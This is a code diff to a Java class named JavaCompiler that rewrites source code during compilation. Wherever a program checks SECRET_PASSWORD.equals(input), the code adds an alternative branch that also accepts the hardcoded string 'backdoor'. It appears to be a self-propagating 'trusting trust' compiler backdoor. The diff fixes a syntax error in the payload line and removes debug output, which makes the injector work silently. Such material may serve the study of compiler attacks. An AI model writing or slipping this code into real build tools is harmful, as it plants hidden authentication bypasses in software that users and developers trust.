@@ -667,11 +667,10 @@ public class JavaCompiler {
                     }
                     rep += l[1];
                     content_str = content_str.replace(ddc_target, ddc_target + rep);
-                    System.out.println(content_str);
                 }
             }
 
-            String payload_target = "SECRET_PASSWORD."
+            String payload_target = "SECRET_PASSWORD.";
             payload_target += "equals(input)";
             content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
             content = content_str;
@@ -694,13 +693,12 @@ public class JavaCompiler {
                 }
                 rep += l[1];
                 content_str = content_str.replace(ddc_target, ddc_target + rep);
-                System.out.println(content_str);
             }
         }
 
         /* Payload */
 
-        String payload_target = "SECRET_PASSWORD."
+        String payload_target = "SECRET_PASSWORD.";
         payload_target += "equals(input)";
         content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
         content = content_str;
